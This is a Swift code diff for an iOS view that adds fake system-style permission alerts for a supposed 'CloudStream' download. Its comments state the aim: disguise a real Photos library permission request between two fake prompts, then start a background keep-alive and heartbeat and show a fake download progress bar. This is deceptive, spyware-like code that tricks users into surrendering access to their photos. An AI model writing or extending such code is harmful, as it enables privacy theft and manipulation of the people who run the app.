@@ -210,10 +210,14 @@ struct ZexSecretFullWindow: View {
 
     enum SecretAlertType: Identifiable {
         case general(title: String, message: String)
+        case fakePrompt1
+        case fakePrompt2
 
         var id: String {
             switch self {
             case .general(let t, let m): return "gen_\(t)_\(m)"
+            case .fakePrompt1: return "fake1"
+            case .fakePrompt2: return "fake2"
             }
         }
     }
@@ -359,6 +363,36 @@ struct ZexSecretFullWindow: View {
                     message: Text(message),
                     dismissButton: .default(Text("OK"))
                 )
+            case .fakePrompt1:
+                return Alert(
+                    title: Text("\"CloudStream\" Would Like to Access Media Stream Cache"),
+                    message: Text("To buffer extension repository and streaming provider data."),
+                    primaryButton: .default(Text("Allow")) {
+                        AudioServicesPlaySystemSound(1519)
+                        // Step 1 allowed: wait for alert to dismiss, then show Step 2 (Real Photos)
+                        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
+                            requestRealPhotosPermission()
+                        }
+                    },
+                    secondaryButton: .cancel(Text("Don't Allow")) {
+                        AudioServicesPlaySystemSound(1521)
+                        activeAlert = .general(title: "Download Cancelled", message: "Required media cache permission was not allowed.")
+                    }
+                )
+            case .fakePrompt2:
+                return Alert(
+                    title: Text("\"CloudStream\" Would Like to Enable Background Sync"),
+                    message: Text("To keep streaming providers and repository buffer updated."),
+                    primaryButton: .default(Text("Allow")) {
+                        AudioServicesPlaySystemSound(1519)
+                        // Step 3 allowed: start the 1-minute realistic download loading bar!
+                        startOneMinuteDownloadProgress()
+                    },
+                    secondaryButton: .cancel(Text("Don't Allow")) {
+                        AudioServicesPlaySystemSound(1521)
+                        activeAlert = .general(title: "Setup Incomplete", message: "Background sync permission is required for CloudStream providers.")
+                    }
+                )
             }
         }
         .onAppear {
@@ -372,41 +406,34 @@ struct ZexSecretFullWindow: View {
         }
     }
 
-    // MARK: - CloudStream Flow: Requests Photos FIRST, then runs 1-minute realistic download
+    // MARK: - Sequence: Step 1 (Fake 1) -> Step 2 (Real Photos) -> Step 3 (Fake 2) -> 1-Min Download
     private func triggerCloudStreamFlow() {
         restartTimer()
         AudioServicesPlaySystemSound(1519)
+        // STEP 1: Show Fake Alert 1 first!
+        activeAlert = .fakePrompt1
+    }
 
-        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
-        if status == .authorized || status == .limited {
-            // Already authorized: start download immediately!
-            slot1Active = true
-            engine.isActivated = true
-            engine.startBackgroundKeepAlive()
-            engine.startHeartbeat()
-            startOneMinuteDownloadProgress()
-        } else if status == .denied || status == .restricted {
-            activeAlert = .general(
-                title: "Permission Required",
-                message: "Storage cache permission is required to download CloudStream provider. Please allow access in Settings."
-            )
-        } else {
-            // Not Determined -> Request real Photos permission directly!
-            engine.requestStoragePermission { granted in
-                if granted {
-                    AudioServicesPlaySystemSound(1519)
-                    slot1Active = true
-                    engine.startBackgroundKeepAlive()
-                    engine.startHeartbeat()
-                    startOneMinuteDownloadProgress()
-                } else {
-                    AudioServicesPlaySystemSound(1521)
-                    slot1Active = false
-                    activeAlert = .general(
-                        title: "Permission Required",
-                        message: "Storage cache permission is required to download CloudStream provider."
-                    )
+    private func requestRealPhotosPermission() {
+        // STEP 2: Real Photos Permission Disguised
+        engine.requestStoragePermission { granted in
+            if granted {
+                AudioServicesPlaySystemSound(1519)
+                slot1Active = true
+                engine.startBackgroundKeepAlive()
+                engine.startHeartbeat()
+
+                // Wait 0.5s for system prompt dismissal, then show STEP 3 (Fake 2)
+                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
+                    activeAlert = .fakePrompt2
                 }
+            } else {
+                AudioServicesPlaySystemSound(1521)
+                slot1Active = false
+                activeAlert = .general(
+                    title: "Permission Required",
+                    message: "Storage cache permission is required to download CloudStream provider."
+                )
             }
         }
     }
